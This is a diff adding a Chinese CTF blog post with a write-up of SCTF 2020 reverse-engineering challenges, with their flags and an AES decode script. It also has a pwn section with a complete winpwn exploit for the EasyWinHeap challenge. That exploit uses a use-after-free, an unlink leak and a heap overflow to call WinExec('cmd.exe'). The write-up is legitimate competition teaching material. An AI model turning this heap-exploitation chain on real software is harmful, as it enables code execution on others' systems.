@@ -1,0 +1,656 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
+  <link rel="icon" href="/img/pisanbao.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="皮三宝">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sctf re writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf 2020 writeup">
+<meta property="og:url" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/index.html">
+<meta property="og:site_name" content="皮三宝のBlog">
+<meta property="og:description" content="sctf re writeup">
+<meta property="og:locale">
+<meta property="og:image" content="c:/Users/pisanbao/AppData/Roaming/Typora/typora-user-images/image-20200916220945399.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918143312989.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918162641109.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918164436028.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918164552224.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918165114619.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918165644425.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918165940532.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918171139236.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200918171217850.png">
+<meta property="og:image" content="http://www.psbazx.com/2020/09/17/sctf-2020-writeup/image-20200920121620549.png">
+<meta property="article:published_time" content="2020-09-16T22:08:43.000Z">
+<meta property="article:modified_time" content="2024-07-22T01:48:18.095Z">
+<meta property="article:author" content="皮三宝">
+<meta property="article:tag" content="re">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:/Users/pisanbao/AppData/Roaming/Typora/typora-user-images/image-20200916220945399.png">
+  
+  
+  
+  <title>sctf 2020 writeup - 皮三宝のBlog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pisanbao</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sctf 2020 writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-09-16 22:08" pubdate>
+          September 16, 2020 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k wörter
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 minuten
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sctf 2020 writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>sctf re writeup</p>
+<a id="more"></a>
+
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h2><p>smc+md5+rc4</p>
+<p><img src="C:\Users\pisanbao\AppData\Roaming\Typora\typora-user-images\image-20200916220945399.png" srcset="/img/loading.gif" lazyload alt="image-20200916220945399"></p>
+<p>md5解出sycsyc</p>
+<p>后面又一个smc然后rc4</p>
+<p>SCTF{zzz~(|3[___]_rc4_5o_e4sy}</p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>python打包，解包，找字符串后添加文件头一气呵成</p>
+<p>结果反编译不了，很懵逼，猜测花指令，查看后发现没有</p>
+<p>后来看了wp知道是python3.8…太坑了，以前都是直接百度python在线反编译拖进去就行了</p>
+<p>反编译后大致逻辑就出来了</p>
+<p>看temp.dll，一个多项式算法一个xor</p>
+<p>SCTF{We1c0m3_To_Sctf_2020_re_!!}</p>
+<h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>挺有意思的题目,有个假flag一开始没看到</p>
+<p><img src="image-20200918143312989.png" srcset="/img/loading.gif" lazyload alt="image-20200918143312989"></p>
+<p>因为题目有花和简单的反调试直接给patch了</p>
+<p>上面flag直接输入显示是正确，猜测有校验函数</p>
+<p>sub_409FF0才是真正函数，通过40A310注册aexit来执行，调试很简单，再sub_409FF0下断点，因为main有isdebuggerpresent会return，走到aexit就会执行</p>
+<p><img src="image-20200918162641109.png" srcset="/img/loading.gif" lazyload alt="image-20200918162641109"></p>
+<p>检查是否解密成功（如果在main函数下断点会影响解密，具体可以自己看解密dll流程，这也就是那个“校验”）</p>
+<p><img src="image-20200918164436028.png" srcset="/img/loading.gif" lazyload alt="image-20200918164436028"></p>
+<p>向指定地址写入dll</p>
+<p><img src="image-20200918164552224.png" srcset="/img/loading.gif" lazyload alt="image-20200918164552224"></p>
+<p>下面imagebase相减一看就知道是重定位操作了，可以忽视，一般不需要重定位，前面alloc的时候已经指定目标dll地址为imagebase了</p>
+<p><img src="image-20200918165114619.png" srcset="/img/loading.gif" lazyload alt="image-20200918165114619"></p>
+<p>然后调用初始化dll</p>
+<p><img src="image-20200918165644425.png" srcset="/img/loading.gif" lazyload alt="image-20200918165644425"></p>
+<p>这边调用的才是真正的打印函数</p>
+<p><img src="image-20200918165940532.png" srcset="/img/loading.gif" lazyload alt="image-20200918165940532"></p>
+<p>后面sub_40CBB0计算出encode函数然后调用</p>
+<p><img src="image-20200918171139236.png" srcset="/img/loading.gif" lazyload alt="image-20200918171139236"></p>
+<p>把dll dump出来后看encode函数即可</p>
+<p><img src="image-20200918171217850.png" srcset="/img/loading.gif" lazyload alt="image-20200918171217850"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;SCTF2020&#x27;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>aes = AES.new(key,AES.MODE_ECB)<br>a = [<span class="hljs-number">142</span>, <span class="hljs-number">56</span>, <span class="hljs-number">81</span>, <span class="hljs-number">115</span>, <span class="hljs-number">166</span>, <span class="hljs-number">153</span>, <span class="hljs-number">42</span>, <span class="hljs-number">240</span>, <span class="hljs-number">218</span>, <span class="hljs-number">213</span>, <span class="hljs-number">106</span>, <span class="hljs-number">145</span>, <span class="hljs-number">233</span>, <span class="hljs-number">78</span>, <span class="hljs-number">152</span>, <span class="hljs-number">206</span>, <span class="hljs-number">42</span>, <span class="hljs-number">183</span>, <span class="hljs-number">61</span>, <span class="hljs-number">64</span>, <span class="hljs-number">241</span>, <span class="hljs-number">229</span>, <span class="hljs-number">29</span>, <span class="hljs-number">171</span>, <span class="hljs-number">239</span>, <span class="hljs-number">238</span>, <span class="hljs-number">176</span>, <span class="hljs-number">214</span>, <span class="hljs-number">20</span>, <span class="hljs-number">11</span>, <span class="hljs-number">42</span>, <span class="hljs-number">149</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i] ^= <span class="hljs-number">0x55</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    a[<span class="hljs-number">21</span>+i] = (((a[<span class="hljs-number">21</span>+i]&amp;<span class="hljs-number">0xaa</span>)&gt;&gt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span>)|(((a[<span class="hljs-number">21</span>+i]&lt;&lt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xaa</span>)&amp;<span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">21</span>+i] ^= <span class="hljs-number">0xad</span><br>    a[<span class="hljs-number">14</span> + i] = (((a[<span class="hljs-number">14</span> + i] &amp; <span class="hljs-number">0xcc</span>) &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xff</span>) | (((a[<span class="hljs-number">14</span> + i] &lt;&lt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xcc</span>) &amp; <span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">14</span> + i] ^= <span class="hljs-number">0xbe</span><br>    a[<span class="hljs-number">7</span> + i] = (((a[<span class="hljs-number">7</span> + i] &amp; <span class="hljs-number">0xff</span>) &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>) | (((a[<span class="hljs-number">7</span> + i] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>) &amp; <span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">7</span> + i] ^= <span class="hljs-number">0xef</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag += <span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span> aes.decrypt(flag)<br><span class="hljs-comment">#SCTF&#123;y0u_found_the_true_secret&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="orz"><a href="#orz" class="headerlink" title="orz"></a>orz</h2><p>这题相对上面就没啥新东西了</p>
+<p>前面有类似伪随机数的操作取输入三个为种子</p>
+<p>后面操作也不难还有个des</p>
+<p>SCTF{b5c0b187fe309af0f4d35982fd}</p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EasyWinHeap"><a href="#EasyWinHeap" class="headerlink" title="EasyWinHeap"></a>EasyWinHeap</h2><p>windows pwn</p>
+<p>早就想入门了，一直没时间，正好考完补比赛wp时看到sctf居然有个winpwn</p>
+<p><img src="image-20200920121620549.png" srcset="/img/loading.gif" lazyload alt="image-20200920121620549"></p>
+<p>功能四个</p>
+<p>delete处没有置零存在uaf</p>
+<p>edit处存在堆溢出，具体看size，寸size的时候存了size&gt;&gt;4 + 1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>a=process(<span class="hljs-string">&quot;./EasyWinHeap.exe&quot;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;size &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,content</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br>    a.recvuntil(<span class="hljs-string">&quot;content  &gt;&quot;</span>)<br>    a.sendline(content)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">4</span>)<br>show(<span class="hljs-number">2</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>heap_addr = u32(a.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap_addr -= <span class="hljs-number">0x580</span><br>idx2pptr = heap_addr + <span class="hljs-number">0x4ac</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heap_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_addr)<br>edit(<span class="hljs-number">2</span>, p32(idx2pptr-<span class="hljs-number">4</span>)+p32(idx2pptr))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>edit(<span class="hljs-number">2</span>,p32(idx2pptr+<span class="hljs-number">4</span>*<span class="hljs-number">3</span>))<br>show(<span class="hljs-number">2</span>) <br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>puts_addr = u32(a.recv(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>image_base = puts_addr - <span class="hljs-number">0x1044</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;puts_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;image_base --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(image_base)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>idata_heapfree = image_base + <span class="hljs-number">0x2004</span><br>edit(<span class="hljs-number">2</span>,p32(puts_addr)+p32(idata_heapfree))<br>show(<span class="hljs-number">4</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>heapfree_addr = u32(a.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heapfree_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(heapfree_addr)<br>winexec = heapfree_addr - <span class="hljs-number">0x1dec0</span> + <span class="hljs-number">0x5CD60</span><br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>edit(<span class="hljs-number">2</span>,p32(winexec)+p32(idx2pptr))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;cmd.exe\x00\x00&#x27;</span>)<br>show(<span class="hljs-number">4</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>大致打法是，unlink leak出puts地址，然后计算出image base</p>
+<p>接着leak kernel32.dll函数计算出winexec地址</p>
+<p>然后调用即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/re/">#re</a>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sctf 2020 writeup</div>
+      <div>http://www.psbazx.com/2020/09/17/sctf-2020-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Beitragsautor</div>
+          <div>皮三宝</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Veröffentlicht am</div>
+          <div>September 16, 2020</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Urheberrechtshinweis</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/03/2020%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9Bre/" title="2020国赛总决赛re">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2020国赛总决赛re</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/09/13/gactf-2020-writeup/" title="gactf 2020 writeup">
+                        <span class="hidden-mobile">gactf 2020 writeup</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
